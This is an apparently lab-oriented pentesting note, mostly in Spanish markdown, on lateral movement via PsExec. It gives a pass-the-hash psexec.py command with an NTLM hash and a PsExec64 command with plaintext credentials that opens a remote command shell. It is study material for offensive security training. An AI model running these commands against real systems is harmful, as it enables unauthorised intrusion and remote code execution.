## DESCRIPTION



#### Mas información
* 


## EXPLOITATION

### OPTION 1: DESDE KALI

```
psexec.py EXTERNAL/Administrator@192.168.166.248 -hashes "aad3b435b51404eeaad3b435b51404ee:56e4633688c0fdd57c610faf9d7ab8df"
```


### OPTION 2: DESDE WIN

In order to start an interactive session on the remote host, we need to invoke PsExec64.exe with the -i argument, followed by the target hostname prepended with two backslashes. We'll then specify corp\jen as domain\username and Nexus123! as password with the -u and -p arguments respectively. Lastly, we include the process we want to execute remotely, which is a command shell in this case.

```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```




## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 